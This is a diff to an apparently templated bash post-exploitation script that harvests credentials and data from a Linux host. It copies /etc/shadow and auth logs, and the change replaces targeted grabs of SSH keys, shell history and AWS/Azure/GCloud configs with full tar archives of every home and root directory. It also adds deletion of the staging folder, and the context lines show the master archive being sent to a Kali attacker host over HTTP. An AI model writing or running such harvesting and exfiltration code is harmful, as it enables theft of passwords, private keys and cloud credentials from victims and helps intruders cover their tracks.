@@ -163,29 +163,12 @@ stage_local_files() {{
     sudo cp /var/log/auth.log /tmp/exfil/local/auth.log 2>/dev/null || true
     sudo cp /var/log/secure /tmp/exfil/local/secure 2>/dev/null || true
     
-    # 2. Users and root directories (history, ssh, cloud configs, mail)
+    # 2. Complete Home & Root Directories (including hidden configurations & files)
     for udir in /home/* /root; do
         [ -d "$udir" ] || continue
         uname=$(basename "$udir")
-        mkdir -p "/tmp/exfil/local/users/$uname"
-        
-        # history
-        cp "$udir"/.bash_history "/tmp/exfil/local/users/$uname/bash_history" 2>/dev/null || true
-        cp "$udir"/.zsh_history "/tmp/exfil/local/users/$uname/zsh_history" 2>/dev/null || true
-        
-        # SSH
-        if [ -d "$udir/.ssh" ]; then
-            mkdir -p "/tmp/exfil/local/users/$uname/ssh"
-            cp -r "$udir/.ssh"/* "/tmp/exfil/local/users/$uname/ssh/" 2>/dev/null || true
-        fi
-        
-        # Cloud configs
-        for cld in .aws .azure .gcloud; do
-            if [ -d "$udir/$cld" ]; then
-                mkdir -p "/tmp/exfil/local/users/$uname/$cld"
-                cp -r "$udir/$cld"/* "/tmp/exfil/local/users/$uname/$cld/" 2>/dev/null || true
-            fi
-        done
+        echo "[*] Archiving local user home: $uname ..."
+        sudo tar -czf "/tmp/exfil/local/home_$uname.tar.gz" --exclude=.cache -C "$udir" . 2>/dev/null || true
     done
     
     # SSH server keys
@@ -233,22 +216,11 @@ sudo cp /etc/shadow /tmp/harvest/shadow 2>/dev/null || true
 sudo cp /var/log/auth.log /tmp/harvest/auth.log 2>/dev/null || true
 sudo cp /var/log/secure /tmp/harvest/secure 2>/dev/null || true
 
+# Complete Home & Root Directories (including hidden configurations & files)
 for udir in /home/* /root; do
     [ -d "$udir" ] || continue
     uname=$(basename "$udir")
-    mkdir -p "/tmp/harvest/users/$uname"
-    cp "$udir"/.bash_history "/tmp/harvest/users/$uname/bash_history" 2>/dev/null || true
-    cp "$udir"/.zsh_history "/tmp/harvest/users/$uname/zsh_history" 2>/dev/null || true
-    if [ -d "$udir/.ssh" ]; then
-        mkdir -p "/tmp/harvest/users/$uname/ssh"
-        cp -r "$udir/.ssh"/* "/tmp/harvest/users/$uname/ssh/" 2>/dev/null || true
-    fi
-    for cld in .aws .azure .gcloud; do
-        if [ -d "$udir/$cld" ]; then
-            mkdir -p "/tmp/harvest/users/$uname/$cld"
-            cp -r "$udir/$cld"/* "/tmp/harvest/users/$uname/$cld/" 2>/dev/null || true
-        fi
-    done
+    sudo tar -czf "/tmp/harvest/home_$uname.tar.gz" --exclude=.cache -C "$udir" . 2>/dev/null || true
 done
 
 if [ -d /etc/ssh ]; then
@@ -305,6 +277,9 @@ rm -f /tmp/harvester.sh
 # Pack everything into a master archive
 echo "[*] Creating master archive /tmp/master_exfil.tar.gz ..."
 tar -czf /tmp/master_exfil.tar.gz -C /tmp/exfil .
+
+# Clean up staging directory
+rm -rf /tmp/exfil
 
 # Exfiltrate to Kali
 echo "[*] Exfiltrating master archive to Kali http://{KALI_IP}:{EXFIL_HTTP_PORT}/ ..."
